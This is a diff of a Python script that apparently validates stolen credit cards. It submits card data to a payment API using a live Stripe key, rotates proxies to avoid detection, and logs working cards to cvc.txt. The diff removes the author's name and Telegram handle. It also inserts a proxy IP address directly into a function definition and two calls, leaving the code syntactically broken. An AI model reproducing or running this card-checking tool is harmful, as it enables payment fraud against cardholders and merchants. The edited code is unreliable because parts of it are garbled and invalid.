@@ -6,7 +6,6 @@ import json
 import requests
 import random
 
-#Made By Bheemesh
 
 
 succcess = open("cvc.txt", "a")
@@ -48,7 +47,7 @@ def randomizer(): #This is to randomize the request content
     jsonrandom = randomocontent.json()
     return jsonrandom
 
-def randomproxy():
+def randomproxy():139.162.166.141:3128
     proxiesread = open("proxies.txt", "r")
     readLinesProxies = proxiesread.readlines()
     randomnum = random.randint(0,proxycount-1)
@@ -88,7 +87,7 @@ def lineCheck():
 
     readproxy.close()
 
-#randomproxy()
+#randomproxy(139.162.166.141:3128)
 
 
 
@@ -152,7 +151,7 @@ def checker(cc,jsonrandom):
     'key': 'pk_live_eBee6q6n88Q6DCAatTPCOycn00XBRXLwKV'
     }
     proxy = "https://182.253.233.77:8081"
-    proxyfromfunction = randomproxy()
+    proxyfromfunction = randomproxy(139.162.166.141:3128)
     proxycheck = {"https":proxyfromfunction}
     try:
         responser = requests.post(url,headers=headers,data=data,proxies= proxycheck)
@@ -252,7 +251,4 @@ def addsuccess(text):
 main()
 
 
-#-----------------------------------------Made By Bheemesh----------------------------------------------------------------------
-#Telegram ID : @hellosre
-#Telegram ID : @hellosre
 
